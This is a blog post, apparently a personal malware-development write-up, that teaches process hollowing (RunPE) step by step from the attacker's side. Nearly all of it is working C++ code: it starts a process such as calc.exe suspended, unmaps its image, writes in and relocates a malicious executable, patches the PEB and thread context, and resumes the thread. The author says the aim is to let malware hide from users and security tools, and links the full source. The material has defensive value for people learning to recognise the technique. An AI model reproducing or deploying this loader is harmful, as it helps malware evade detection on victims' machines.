---
title: Malware Launching - Process Hollowing
categories:
- Malware Development
description: Process Hollowing to execute malware from remote process
---

# Malware Launching - Process Hollowing

## 1. Context


This is another malware launching technique that I have been really interested in learning about. The idea about malware launching is that you have an malicious executable, and you want to execute it like a normal process on your machine.


However, most of the average Windows users are aware of [Task Manager](https://en.wikipedia.org/wiki/Task_Manager_(Windows)), and they can easily spot out any weird processes running on the machine.


Let's say that my malware's name is **Malware.exe**. This is what will be shown on Task Manager.


![alt text](/uploads/TaskManager.PNG)


When a user sees this, they can easily click *"End Task"* to kill the process, and the malware is deactivated.


In order to achieve stealth, the malware should be launch as another innocent process(such as [Windows Explorer](https://en.wikipedia.org/wiki/Internet_Explorer), [Calculator](https://en.wikipedia.org/wiki/Windows_Calculator)). The condition is that these programs' executables must exist on all Windows machine in order for the malware to perform Process Hollowing, and that's why Explorer and Calculator are some of the viable choice.


I have seen a lot of malware use this technique to avoid evasion, and I have been trying to recreate the technique on my own. My first attempt is using Rust, but programming malware in Rust is just annoying for a variety of reasons. Therefore, I kinda forced myself to learn C++ to finally be able to code this technique out.


## 2. Process Hollowing Concept


Process Hollowing is also known as RunPE, and it is widely used in [RATs](https://www.dnsstuff.com/remote-access-trojan-rat). Just like its nickname, the final goal of the technique is to execute/run a PE executable.


The idea of this technique is that the malware launcher will create a new process from the victim's executable(e.g. *explorer.exe*), empty/hollow out the executable's image in its memory, and then write the content of the malicious code into that virtual memory space of the victim's process.


When the process is resumed, the victim's process will execute normally, except that it will execute the malicious code instead of its own functionality.


From what I see that most malware uses, this the the sequence of code that they usually have when they perform this technique.
  - First, it will call [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) to create the victim process in suspended state
  - Next, it will call [NtUnmapViewOfSection](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection) that takes in a process and a base address. It will unmap the memory region at that base address from the process's virtual memory. Basically, the executable image of the original process will be cleaned out with this.
  - Then, it will call [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate enough virtual memory to write the malicious executable image
  - Then, it will call [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the malicious executable image into the base address from earlier!
  - And finally, it will call [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to resume the suspended process, and the malicious image will be executed from the victim process.


Here is how it would look from a reverse engineer's POV when reversing a malware that uses this technique.
![alt text](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt48518cf20d6cc2f4/5e2f91067f451542df72a22b/process-injection-techniques-blogs-runpe-ex.png)


Now, let's try to program this from the malware writter's POV!


## 3. The actual code


### I. Set up


First, we need to be able to call **NtUnmapViewOfSection**. This function is exported from *ntdll.dll*, so we kind of have to use [GetModuleHandleA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) and [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) in order to get the address of **NtUnmapViewOfSection**.


``` cpp
NTSTATUS(NTAPI* _NtUnmapViewOfSection) (IN HANDLE ProcessHandle, IN PVOID BaseAddress);
BOOL loadNtUnmapViewOfSection() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return FALSE;
	}
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	if (!fpNtUnmapViewOfSection) {
		return FALSE;
	}
	_NtUnmapViewOfSection = (NTSTATUS(NTAPI*) (HANDLE, PVOID))fpNtUnmapViewOfSection;
	return TRUE;
}
```


Also, let's create some helper function to get the NT Header, any data directory, and specifically check if the malicious file has any relocation directory. These are covered in my previous blog post [here](https://cdong1012.github.io/reverse%20engineering/2020/08/15/PE-Parser/), so I won't dive too deep into these.

``` cpp
PIMAGE_NT_HEADERS32 getNTHeaders32(PVOID fileBuffer) {
	if (!fileBuffer) {
		return NULL;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	PIMAGE_NT_HEADERS32 pNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORDLONG)fileBuffer + pDosHeader->e_lfanew);
	return pNTHeaders32;
}

PIMAGE_DATA_DIRECTORY getDataDirectories32(PVOID fileBuffer, DWORD dwDirectoryID) {
	if (dwDirectoryID >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES || !fileBuffer) {
		return NULL;
	}

	PIMAGE_NT_HEADERS32 pNTHeaders32 = getNTHeaders32(fileBuffer);
	if (!pNTHeaders32) {
		return NULL;
	}

	PIMAGE_DATA_DIRECTORY pDataDirEntry = (PIMAGE_DATA_DIRECTORY) & (pNTHeaders32->OptionalHeader.DataDirectory[dwDirectoryID]);
	if (!pDataDirEntry) {
		return NULL;
	}
	return pDataDirEntry;
}

BOOL hasRelocDirectory(PVOID fileBuffer) {
	return getDataDirectories32(fileBuffer, IMAGE_DIRECTORY_ENTRY_BASERELOC) != NULL;
}
```


### II. Create suspended process


When creating process using [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa), we must create 2 structs, **PROCESS_INFORMATION** and **STARTUPINFO**. These will be populated with the correct values when **CreateProcess** succeeds.


The thing we care the most about is the **PROCESS_INFORMATION** because it contains the thread/process handles and IDs!


``` cpp
PROCESS_INFORMATION processInfo = PROCESS_INFORMATION();
STARTUPINFO startupInfo = STARTUPINFO();

startupInfo.cb = sizeof(STARTUPINFO);
if (!CreateProcess(
    NULL,
    targetPath,
    NULL,
    NULL,
    FALSE,
    CREATE_SUSPENDED,
    NULL,
    NULL,
    &startupInfo,
    &processInfo
)) {
    printf("[*] Creating process fails...\n");
    return FALSE;
}

printf("Created process PID %d\n", processInfo.dwProcessId);
```


Notice that for the field *dwCreationFlags*, we are passing in **CREATE_SUSPENDED** in order to create the process in suspended state. To check if the process is created corrected, we can use Task Manager.

![alt text](/uploads/suspended.PNG)


### III. Full Setup and Context


First, we need to call **loadNtUnmapViewOfSection** in order to use **NtUnmapViewOfSection**. Also, we need to create a NT Header from calling **getNTHeaders32** and create related variables that we need.

``` cpp
DWORDLONG dwlDesiredBase = NULL; // desired base to load the remote image
BOOL unmapTarget = FALSE;        // whether to unmap target or not
if (!loadNtUnmapViewOfSection()) {
    printf("Can't load NtUnmapViewOfSection\n");
    return FALSE;
}

PIMAGE_NT_HEADERS32 pNtHeaders = getNTHeaders32(pBuffer);
if (!pNtHeaders) {
    printf("Invalid PE file...\n");
    return FALSE;
}

DWORDLONG dwlOldImageBase = pNtHeaders->OptionalHeader.ImageBase;
SIZE_T	imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

//set subsystem always to GUI to avoid crashes
pNtHeaders->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
```


Next, we need to get the [CONTEXT] of the thread. This struct contains processor-specific register data of the newly created thread, such as the image base address of the target from the *Ebx* field and Eax as entry point.

``` cpp
    DWORD dwResult;
#if defined(_WIN64)
	WOW64_CONTEXT context = WOW64_CONTEXT(); // if the image is 64 bit
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = Wow64GetThreadContext(processInfo.hThread, &context);
#else
	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_INTEGER;
	dwResult = GetThreadContext(processInfo.hThread, &context);
#endif

	if (!dwResult) {
		printf("Get thread context fails...\n");
		return FALSE;
	}
```


One of the reasons we are getting the CONTEXT of the thread is because it contains the address of the PEB of the thread, which contains the victim's process's image base in its virtual memory! We need this information if we want to unmap memory from a remote process.


``` cpp
DWORD dwPEBAddr = context.Ebx; // Address of PEB is stored in ebx

DWORD dwTargetImageBase = 0;
// read in target image base
if (!ReadProcessMemory(
    processInfo.hProcess,
    LPVOID(dwPEBAddr + 8),
    &dwTargetImageBase,
    sizeof(DWORD),
    NULL
)) {
    printf("Can't read from PEB...\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}
if (!dwTargetImageBase) {
    printf("Can't read from PEB...\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}
```


Borowing the [PEB] typedef struct from x64dbg [source code](https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h).

``` cpp
typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace; // 1 byte
    BOOLEAN ReadImageFileExecOptions; // 1 byte
    BOOLEAN BeingDebugged; // 1 byte
    union
    {
        BOOLEAN BitField; 
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        } s1;
    } u1; // 2 bytes

    HANDLE Mutant; // 4 Bytes

    PVOID ImageBaseAddress;
    // ... there are a lot more fields but we don't care about them
} PEB, *PPEB;

```


We can see that the field *ImageBaseAddress* is 8 bytes away from the address of the PEB struct. Hence that's why I'm using 

``` cpp
LPVOID(dwPEBAddr + 8)
```

for the *lpBaseAddress* field when calling [ReadProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory).


### IV. Hollowing


First, in order to decide if we need to relocate the image or not, we must check if the PE file has a relocation directory or not using the helper function *hasRelocDirectory* we created earlier.


If the file does not have a relocation directory, this means we do not need to relocate, and our desire image base should be the original image base taken from the file's Optional Header. Usually, the linker will assume that the image will be loaded at the original base addresss if there is no relocation table.


``` cpp
if (hasRelocDirectory(pBuffer) == FALSE) {
    // if file has no relocations, have to use original image base
    dwlDesiredBase = pNtHeaders->OptionalHeader.ImageBase;
}
```

Next, we check if we need to unmap the target or not. Unmapping should happen when the target image base (which is where the victim's executable is at in its virtual memory) equals to the desired image base. If our desired image base is different from the target image base, there is no need for mapping because we can just change the victim's process's entry point to our desired image base address without needing to hollow out the existing executable.


``` cpp
if (unmapTarget || (DWORDLONG)dwTargetImageBase == dwlDesiredBase) {
    // Unmap if specify unmapTarget or desiredBase is the same as targetimagebase
    if (_NtUnmapViewOfSection(processInfo.hProcess, (PVOID)dwTargetImageBase) != ERROR_SUCCESS) {
        printf("Unmapping target fail\n");
        TerminateProcess(processInfo.hProcess, 1);
        return FALSE;
    }
}
```


The final step of unmapping is that we need to allocate a big enough buffer to store our malicious image in the virtual address space of the victim. We know that we need to allocate from the desired base address, so this is just a simple call to **VirtualAllocEx**

``` cpp
// allocate virtual space most suitable for payload
LPVOID lpRemoteAddress = VirtualAllocEx(
    processInfo.hProcess,
    (LPVOID)dwlDesiredBase,
    imageSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE  // need to be able to write to and execute this page
);

if (!lpRemoteAddress) {
    printf("Can't allocate memory in remote process\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}

// change image base in file headers to the newly allocated region
pNtHeaders->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)lpRemoteAddress);
```


We also need to change the image base in the malicious file buffer to the newly allocated remote buffer address. This is for the linker to correctly load and execute the executable once we write it into this memory address.


### V. Relocation


Before relocating, we should prepare the image in our local memory so it is easier to edit, write to, and apply relocations. Afterward, we can just copy it into the remote memory space.


``` cpp
LPVOID lpLocalAddress = VirtualAlloc(
    NULL, // null because we are allocating in local virtual space
    imageSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

if (!lpLocalAddress) {
    printf("Can't allocate memory in local process\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}
```

#### Write PE into local memory
Next, we create a helper function to write our malicious file into this buffer called *mapPEVirtualLocal*.

``` cpp 
BOOL mapPEVirtualLocal(PVOID fileBuffer, SIZE_T bufferSize, LPVOID baseAddress) {
	if (!fileBuffer) {
		printf("File buffer is null\n");
		return FALSE;
	}

	PIMAGE_NT_HEADERS32 pNtHeaders32 = getNTHeaders32(fileBuffer);
	if (!pNtHeaders32) {
		printf("Not valid PE file\n");
		return FALSE;
	}

	// Copy all the headers into baseAddress
	memcpy(baseAddress, fileBuffer, (size_t)pNtHeaders32->OptionalHeader.SizeOfHeaders);

	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORDLONG)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
	// iterate through all the sections and copy them
	DWORD dwNumSections = pNtHeaders32->FileHeader.NumberOfSections;

	for (DWORD i = 0; i < dwNumSections; i++) {
		LPVOID sectionBaseAddress = (BYTE*)baseAddress + pSectionHeader->VirtualAddress;
		memcpy(
			sectionBaseAddress,
			(BYTE*)fileBuffer + pSectionHeader->PointerToRawData,
			pSectionHeader->SizeOfRawData
		);
		printf("[*] Copying section %s to %p\n", pSectionHeader->Name, sectionBaseAddress);
		pSectionHeader++;
	}
	return TRUE;
}
```

First, we get the NT header of the file in order to extract the *SizeOfHeaders* field.


Then, we copy *SizeOfHeaders* bytes into the base address.

After that, we must iterate through all the section and copy every section using their *PointerToRawData* and *SizeOfRawData* field.


#### Applying Relocation


If the base address of the payload changes during our execution, we must apply relocation.


I create 2 helper functions for this that takes in the old base address of the malicious image,the new remote address in the victim's memory, and the file buffer.


First, we need to define the struct **BASE_RELOCATION_ENTRY** because I can't find it in any library. This struct has the size of a *DWORD* which is 16 bits. Every relocation block contains a virtual address of the Relocation table in memory and a bunch of **BASE_RELOCATION_ENTRY**s that contains the offset of the to-be-relocated address.

``` cpp
typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
```

In order to relocate each block, we must:
  - Iterates through every **BASE_RELOCATION_ENTRY** struct in the block
  - Extract the *Offset* field
  - Get the relocate address by ``` imageBase + RelocBlockVA + entryOffset ```
  - The value dereference from this address will be an address offset away from the image base.
  - To get the relocate offset, we find the difference between this address offset from the image base
  - Finally, we add that offset with the new remote base address and write it back to the relocate address above.


``` cpp
BOOL applyRelocateBlock32(PBASE_RELOCATION_ENTRY pRelocEntry, DWORD dwNumberOfEntries, DWORD dwPage, DWORDLONG dwlOldBaseAddress, DWORDLONG dwlNewBaseAddress, PVOID pBuffer) {
	PBASE_RELOCATION_ENTRY tempEntry = pRelocEntry;
	DWORD i;
	for (i = 0; i < dwNumberOfEntries; i++) {
		if (!tempEntry)
			break;
		DWORD dwOffset = tempEntry->Offset;
		DWORD dwType = tempEntry->Type;
		if (dwType == 0)
			break;

		if (dwType != 3) {
			printf("Not supported relocations format %d\n", dwType);
			return FALSE;
		}

		PDWORD pdwRelocateAddr = (PDWORD)((ULONG_PTR)pBuffer + dwPage + dwOffset);
		(*pdwRelocateAddr) = static_cast<DWORD>((*pdwRelocateAddr) - (ULONG_PTR)dwlOldBaseAddress) + dwlNewBaseAddress;
		tempEntry = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)tempEntry + sizeof(WORD));
	}
	printf("[+] Applied %d relocations\n", static_cast<int>(i));
	return TRUE;
}
```


Finally, we need to relocate an entire Relocation directory.
  - We need to find the **IMAGE_DATA_DIRECTORY** of the relocation table
  - Iterate through each **IMAGE_BASE_RELOCATION** struct to get each relocation block
  - Call *applyRelocateBlock32* for each block


``` cpp
BOOL applyRelocation(DWORDLONG dwlOldBaseAddress, DWORDLONG dwlNewBaseAddress, PVOID pBuffer) {
	PIMAGE_DATA_DIRECTORY pDataDirReloc = getDataDirectories32(pBuffer, IMAGE_DIRECTORY_ENTRY_BASERELOC);

	if (!pDataDirReloc) {
		printf("Executable does not have relocation table\n");
		return FALSE;
	}

	DWORD dwRelocSize = pDataDirReloc->Size;
	DWORD dwRelocVA = pDataDirReloc->VirtualAddress;

	PIMAGE_BASE_RELOCATION pBaseReloc = NULL;
	DWORD dwParsedSize = 0;
	while (dwParsedSize < dwRelocSize) {
		pBaseReloc = (PIMAGE_BASE_RELOCATION)(dwRelocVA + dwParsedSize + (ULONG_PTR)pBuffer);
		dwParsedSize += pBaseReloc->SizeOfBlock;
		if (pBaseReloc->SizeOfBlock == 0 || pBaseReloc->VirtualAddress == NULL) {
			pBaseReloc++;
			continue;
		}

		printf("Relocation block: 0x%x 0x%x\n", pBaseReloc->VirtualAddress, pBaseReloc->SizeOfBlock);

		DWORD dwNumberOfEntries = (pBaseReloc->SizeOfBlock - 2 * sizeof(DWORD)) / sizeof(WORD);
		printf("	Num entries: 0x%x\n", dwNumberOfEntries);
		PBASE_RELOCATION_ENTRY pRelocEntry = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)pBaseReloc + sizeof(DWORD) + sizeof(DWORD));
		if (applyRelocateBlock32(
			pRelocEntry,
			dwNumberOfEntries,
			pBaseReloc->VirtualAddress,
			dwlOldBaseAddress,
			dwlNewBaseAddress,
			pBuffer
		) == FALSE) {
			return FALSE;
		}
	}
	return TRUE;
}
```

Then, in our main code, we can just check if the remote address is not the same with the old image address space. If it's not, we call *applyRelocation*.

``` cpp
if ((DWORDLONG)lpRemoteAddress != dwlOldImageBase) {
    if (!applyRelocation(
        dwlOldImageBase,
        (DWORDLONG)lpRemoteAddress,
        lpLocalAddress
    )) {
        printf("Can't relocate image\n");
        TerminateProcess(processInfo.hProcess, 1);
        return FALSE;
    }
}
```

### VI. Copy image from local to remote


Now that we have relocate everything in the local virtual space, we just need to write the entire local image to the remote address in the victim's address space using **WriteProcessMemory**.


``` cpp
SIZE_T writtenBytes = 0;

if (!WriteProcessMemory(
    processInfo.hProcess, 
    lpRemoteAddress, 
    lpLocalAddress, 
    imageSize, 
    &writtenBytes
)) {
    printf("Can't write local image to remote process image\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}
if (writtenBytes != imageSize) {
    printf("Can't write local image to remote process image\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}

VirtualFree(lpLocalAddress, imageSize, MEM_FREE);
```


After writing the local image, we must make sure to free the region because we called **VirtualAlloc** earlier and it won't be freed by itself.


### VII. Fix up CONTEXT and PEB


Remember that the virtual base address in the PEB of the victim process contains the old base address of the victim's image.


Since we wrote our malicious image to a new remote address, we must change the PEB's virtual image base to this new address in order to ensure that the process loads the image correctly.


We should use **WriteProcessMemory** to override that field in PEB with *lpRemoteAddress*

``` cpp
DWORD dwRemoteAddr32b = static_cast<DWORD>((ULONGLONG)lpRemoteAddress);
if (!WriteProcessMemory(
    processInfo.hProcess,
    LPVOID(dwPEBAddr + 8),
    &dwRemoteAddr32b,
    sizeof(DWORD),
    &writtenBytes
)) {
    printf("Failed overwriting PEB\n");
    TerminateProcess(processInfo.hProcess, 1);
    return FALSE;
}
```


Next, we need to fix up the context of the victim's thread. The entry point of a process is stored in the **eax** register before the process starts, and this will specify where in memory the process should start execute the image.


Since the *AddressOfEntryPoint* field in the Optional header gives an offset away from the base address of the entry point, the new entry point is simply just this adds the remote address base *lpRemoteAddress*.


``` cpp
context.Eax = static_cast<DWORD>((DWORDLONG)lpRemoteAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
```


### VIII. Apply change to CONTEXT and resume


Since we change the context of the thread a bit, we must reapply this new change by calling [SetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) to make sure the victim thread will use our new context.


After all, we call [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to resume the process because we intially create it in the suspended state.


``` cpp
SetThreadContext(processInfo.hThread, &context);
ResumeThread(processInfo.hThread);
```


## 3. Wrapping up


Now that we are done with the code, let's see how it executes. I'm using the same executable from the previous blog [post](https://cdong1012.github.io/malware%20development/2020/08/16/DLL-Injection/) to test the injection here. The victim will be the Calculator app on Windows 10.


{% include figure.html image="/uploads/finalProcessHollowing.gif" position="center" %}


As you can see, our malware is being ran as **Calc.exe**. It even has the icon of Calculator! This is a really good technique if a malware wants to hide itself from the Windows user and the security protocols being applied.


I had a fun week trying to figure and understand all of this to program it out. It took me forever to research and look things up online about how people implement their own process hollowing techniques.


From the malware analysis's POV, this technique is certainly not that impressive because you can clearly see and identify this with a few calls. However, I gain a tremendous respect for malware authors who actually sits down and codes most of this out to deploy their own malware because I was miserable figuring out and programming this by myself.


If you want to check out the source code, you can view it on my github [repo](https://github.com/cdong1012/ProcessHollowing) here!

